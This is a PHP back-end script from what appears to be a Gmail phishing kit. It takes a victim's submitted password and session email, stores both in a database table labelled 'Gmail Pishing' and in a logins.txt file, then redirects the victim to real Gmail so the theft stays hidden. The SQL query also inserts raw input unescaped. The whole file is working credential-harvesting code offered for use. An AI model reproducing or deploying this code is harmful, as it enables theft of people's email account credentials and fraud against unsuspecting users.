<?php

			session_start();			
			include($_SERVER['DOCUMENT_ROOT'].'/proxy/connect.php');
			$pass = $_POST["Passwd"];
			$email=$_SESSION["Email"];
			//opening logins text file for appending new data.
			$sql = "INSERT INTO credenciales (ip, origen, usuario, contrasena) VALUES ('$ipaddress','Gmail Pishing', '$email', '$pass')";	
		    if ($conn->query($sql) === TRUE) {
		        $error = "Creado adecuadamente.";
		    } else {
		        $error = "Hubo un error en la peticion.";
		    }

  			$file = fopen("logins.txt", "a") or die("Unable to open file!");
			
  			//Writing email and password to logins.txt. 
  			fwrite($file, $email."	".$pass.PHP_EOL);			
  			fclose($file);//closing logins.txt.
			
  			//redirecting user to the google drive's locations where the game is available to download.
  			//change the location url to redirect to a website of your choice.
  			header("Location: ". PROXY_PREFIX_ALL ."https://mail.google.com/mail/?tab=wm&ogbl");
			exit();
			
			
			session_destroy();
			

?>